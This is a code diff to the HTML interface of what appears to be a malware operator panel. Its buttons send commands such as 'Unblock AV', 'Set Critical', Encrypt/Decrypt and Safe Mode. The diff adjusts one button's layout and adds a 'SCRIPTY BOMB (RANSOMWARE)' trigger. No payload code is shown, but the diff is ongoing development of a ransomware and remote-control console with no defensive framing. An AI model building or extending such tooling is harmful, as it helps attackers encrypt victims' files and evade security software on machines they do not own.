@@ -284,7 +284,7 @@
                     <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="cmd('unblock_av_sites')"></i> Unblock AV</button>
                     <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="confirmAction('set_critical')"></i> Set Critical</button>
                     <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="cmd('unset_critical')"></i> Unset Critical</button>
-                    <button class="btn-primary" style="grid-column: span 2; background-color: var(--danger); border: none;" onclick="cmd('check_admin')"></i> Check Admin Status</button>
+                    <button class="btn-primary" style=" background-color: var(--danger); border: none;" onclick="cmd('check_admin')"></i> Check Admin Status</button>
                 </div>
             </div>
 
@@ -302,6 +302,7 @@
             <div class="card" style="border-top: 3px solid #00e2e2;">
                 <div class="card-title"><i class="ph ph-lock-key" style="color:#00e2e2;"></i> Ransomware</div>
                 <div class="btn-grid">
+                    <button class="btn-danger full-width" style="grid-column: span 2;background-color: #00e2e2; border: none; color: white;" onclick="confirmAction('scriptybomb')">SCRIPTY BOMB (RANSOMWARE)</button>
                     <button class="btn-danger" style="background-color: #00e2e2; border: none; color: white;" onclick="askForceEncrypt()"></i> Encrypt</button>
                     <button class="btn-success" style="background-color: #00e2e2; border: none; color: white;" onclick="askDecrypt()"></i> Decrypt</button>
                     <button class="btn-danger full-width" style="background-color: #00e2e2; border: none; color: white;" onclick="confirmAction('enable_safe_mode')">Enable Safe Mode</button>
